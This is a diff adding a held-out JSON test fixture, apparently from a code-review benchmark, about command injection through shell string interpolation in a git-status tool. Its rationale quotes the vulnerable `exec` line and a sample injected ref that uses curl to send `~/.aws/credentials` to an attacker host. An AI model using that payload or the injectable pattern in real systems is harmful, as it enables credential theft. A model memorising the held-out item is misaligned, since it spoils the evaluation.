@@ -1,0 +1,51 @@
+{
+  "id": "command-injection-exec-true",
+  "category": "security:command-injection",
+  "split": "held-out",
+  "proves": "HELD OUT. A shell invocation built from request data. Neither stage covered command injection at all, which is a gap in the taxonomy rather than in any model.",
+  "files": [
+    "src/tools/git-status.ts"
+  ],
+  "expectedFindings": [
+    {
+      "path": "src/tools/git-status.ts",
+      "quote": "  const { stdout } = await exec(`git -C ${repo} status --porcelain ${ref}`);",
+      "side": "RIGHT",
+      "line": 2,
+      "severity": "critical",
+      "explanationMentions": [
+        [
+          "inject",
+          "shell",
+          "metacharacter",
+          "substitut",
+          "escap",
+          "sanitis",
+          "sanitiz",
+          "quote",
+          "argument"
+        ],
+        [
+          "exec",
+          "spawn",
+          "command",
+          "untrusted",
+          "user",
+          "attacker",
+          "interpolat"
+        ]
+      ],
+      "rationale": "Template interpolation into a shell string means `repo` and `ref` are parsed by the shell. A `ref` of `x; curl attacker/$(cat ~/.aws/credentials)` runs as a separate command, and even a benign-looking `$(...)` in a branch name expands.\\n\\nThe pre-image used `execFile` with an argument array, which does not invoke a shell and is therefore not injectable. The diff removes exactly the property that made this safe, which is the same shape as the path-traversal fixture: the danger is in what was deleted."
+    }
+  ],
+  "expectedNoFindings": [
+    "The function signature and return type are unchanged."
+  ],
+  "forbiddenFindings": [
+    {
+      "quote": "export async function gitStatus",
+      "reason": "the signature did not change"
+    }
+  ],
+  "injection": false
+}
